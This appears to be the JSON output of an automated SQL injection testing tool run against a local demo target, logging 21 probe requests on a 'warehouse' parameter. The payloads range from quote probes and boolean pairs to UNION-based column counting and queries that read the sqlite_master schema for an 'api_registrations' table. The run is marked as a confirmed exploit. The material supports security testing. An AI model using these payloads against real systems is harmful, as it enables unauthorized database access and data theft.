@@ -1,0 +1,362 @@
+{
+ "status": "ok",
+ "claim": "exploited_confirmed",
+ "target": "c-demo-target",
+ "class": "sqli",
+ "path": "/reports/exception-queue",
+ "param": "warehouse",
+ "markers": [
+  "CREATE TABLE"
+ ],
+ "baseline": {
+  "n": 1,
+  "step": "baseline",
+  "value": "1",
+  "status": 200,
+  "length": 2023,
+  "markers_hit": [],
+  "elapsed_ms": 3,
+  "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1",
+  "note": "",
+  "poc_candidate_id": "sqli-1289a8d51afe"
+ },
+ "anomalies": [
+  {
+   "n": 2,
+   "step": "quote_probe",
+   "value": "1'",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 21,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27",
+   "note": "",
+   "poc_candidate_id": "sqli-51b62d5226ad"
+  },
+  {
+   "n": 5,
+   "step": "comment_probe_hash",
+   "value": "1'#",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 15,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%23",
+   "note": "",
+   "poc_candidate_id": "sqli-949f54c8a7b8"
+  },
+  {
+   "step": "boolean_pair",
+   "note": "boolean differential",
+   "true": {
+    "status": 200,
+    "length": 5872
+   },
+   "false": {
+    "status": 200,
+    "length": 2085
+   }
+  }
+ ],
+ "column_count": 7,
+ "hit": {
+  "n": 21,
+  "step": "exfil_targeted:rot=0",
+  "value": "1' UNION SELECT type, name, sql, tbl_name, rootpage, 1, 1 FROM sqlite_master WHERE name='api_registrations'-- ",
+  "status": 200,
+  "length": 2760,
+  "markers_hit": [
+   "CREATE TABLE"
+  ],
+  "elapsed_ms": 21,
+  "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20type%2C%20name%2C%20sql%2C%20tbl_name%2C%20rootpage%2C%201%2C%201%20FROM%20sqlite_master%20WHERE%20name%3D%27api_registrations%27--%20",
+  "note": "",
+  "poc_candidate_id": "sqli-120757b197fe",
+  "confirmed": true
+ },
+ "attempts": [
+  {
+   "n": 1,
+   "step": "baseline",
+   "value": "1",
+   "status": 200,
+   "length": 2023,
+   "markers_hit": [],
+   "elapsed_ms": 3,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1",
+   "note": "",
+   "poc_candidate_id": "sqli-1289a8d51afe"
+  },
+  {
+   "n": 2,
+   "step": "quote_probe",
+   "value": "1'",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 21,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27",
+   "note": "",
+   "poc_candidate_id": "sqli-51b62d5226ad"
+  },
+  {
+   "n": 3,
+   "step": "dquote_probe",
+   "value": "1\"",
+   "status": 200,
+   "length": 2035,
+   "markers_hit": [],
+   "elapsed_ms": 28,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%22",
+   "note": "",
+   "poc_candidate_id": "sqli-b6d179ad0ac2"
+  },
+  {
+   "n": 4,
+   "step": "comment_probe",
+   "value": "1' -- ",
+   "status": 200,
+   "length": 2043,
+   "markers_hit": [],
+   "elapsed_ms": 14,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-e71fc5de1d97"
+  },
+  {
+   "n": 5,
+   "step": "comment_probe_hash",
+   "value": "1'#",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 15,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%23",
+   "note": "",
+   "poc_candidate_id": "sqli-949f54c8a7b8"
+  },
+  {
+   "n": 6,
+   "step": "boolean_pair:true",
+   "value": "1' OR '1'='1",
+   "status": 200,
+   "length": 5872,
+   "markers_hit": [],
+   "elapsed_ms": 2,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20OR%20%271%27%3D%271",
+   "note": "",
+   "poc_candidate_id": "sqli-8c4974ed0533"
+  },
+  {
+   "n": 7,
+   "step": "boolean_pair:false",
+   "value": "1' OR '1'='2",
+   "status": 200,
+   "length": 2085,
+   "markers_hit": [],
+   "elapsed_ms": 26,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20OR%20%271%27%3D%272",
+   "note": "",
+   "poc_candidate_id": "sqli-4335d5c8e340"
+  },
+  {
+   "n": 8,
+   "step": "column_count:n=1",
+   "value": "1' UNION SELECT NULL-- ",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 15,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20NULL--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-11398dafccc3"
+  },
+  {
+   "n": 9,
+   "step": "column_count:n=2",
+   "value": "1' UNION SELECT NULL, NULL-- ",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 14,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20NULL%2C%20NULL--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-168cbfc48106"
+  },
+  {
+   "n": 10,
+   "step": "column_count:n=3",
+   "value": "1' UNION SELECT NULL, NULL, NULL-- ",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 15,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-1f376ca0c220"
+  },
+  {
+   "n": 11,
+   "step": "column_count:n=4",
+   "value": "1' UNION SELECT NULL, NULL, NULL, NULL-- ",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 13,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-56c705d3ef51"
+  },
+  {
+   "n": 12,
+   "step": "column_count:n=5",
+   "value": "1' UNION SELECT NULL, NULL, NULL, NULL, NULL-- ",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 15,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-f4c19a436aa5"
+  },
+  {
+   "n": 13,
+   "step": "column_count:n=6",
+   "value": "1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 16,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-c63209433108"
+  },
+  {
+   "n": 14,
+   "step": "column_count:n=7",
+   "value": "1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ",
+   "status": 200,
+   "length": 2346,
+   "markers_hit": [],
+   "elapsed_ms": 3,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-86a874ce6c74"
+  },
+  {
+   "n": 15,
+   "step": "column_count:n=8",
+   "value": "1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 25,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-9fba23e3133e"
+  },
+  {
+   "n": 16,
+   "step": "column_count:n=9",
+   "value": "1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 13,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-4f5a6a10ecb6"
+  },
+  {
+   "n": 17,
+   "step": "column_count:n=10",
+   "value": "1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 14,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-f07147ee6cc1"
+  },
+  {
+   "n": 18,
+   "step": "column_count:n=11",
+   "value": "1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 14,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-a937eb1b4248"
+  },
+  {
+   "n": 19,
+   "step": "column_count:n=12",
+   "value": "1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ",
+   "status": 500,
+   "length": 1014,
+   "markers_hit": [],
+   "elapsed_ms": 3,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-3c5fa7312ba4"
+  },
+  {
+   "n": 20,
+   "step": "introspect:rot=0",
+   "value": "1' UNION SELECT type, name, sql, tbl_name, rootpage, 1, 1 FROM sqlite_master-- ",
+   "status": 200,
+   "length": 5613,
+   "markers_hit": [
+    "CREATE TABLE"
+   ],
+   "elapsed_ms": 2,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20type%2C%20name%2C%20sql%2C%20tbl_name%2C%20rootpage%2C%201%2C%201%20FROM%20sqlite_master--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-436258021273",
+   "confirmed": true
+  },
+  {
+   "n": 21,
+   "step": "exfil_targeted:rot=0",
+   "value": "1' UNION SELECT type, name, sql, tbl_name, rootpage, 1, 1 FROM sqlite_master WHERE name='api_registrations'-- ",
+   "status": 200,
+   "length": 2760,
+   "markers_hit": [
+    "CREATE TABLE"
+   ],
+   "elapsed_ms": 21,
+   "url": "http://127.0.0.1:8093/reports/exception-queue?warehouse=1%27%20UNION%20SELECT%20type%2C%20name%2C%20sql%2C%20tbl_name%2C%20rootpage%2C%201%2C%201%20FROM%20sqlite_master%20WHERE%20name%3D%27api_registrations%27--%20",
+   "note": "",
+   "poc_candidate_id": "sqli-120757b197fe",
+   "confirmed": true
+  }
+ ],
+ "budget": {
+  "requests_used": 21,
+  "requests_cap": 40,
+  "seconds_used": 0.49,
+  "seconds_cap": 120.0
+ },
+ "notes": [
+  "column_count_ok=[7]",
+  "introspect_table=api_registrations",
+  "introspect_table=api_registrations"
+ ],
+ "queue": {
+  "total": 21,
+  "pending": 21,
+  "approved": 0,
+  "rejected": 0,
+  "duplicates": 0,
+  "by_evidence": {
+   "untried": 19,
+   "confirmed": 2
+  },
+  "by_source": {
+   "menu": 21
+  }
+ }
+}
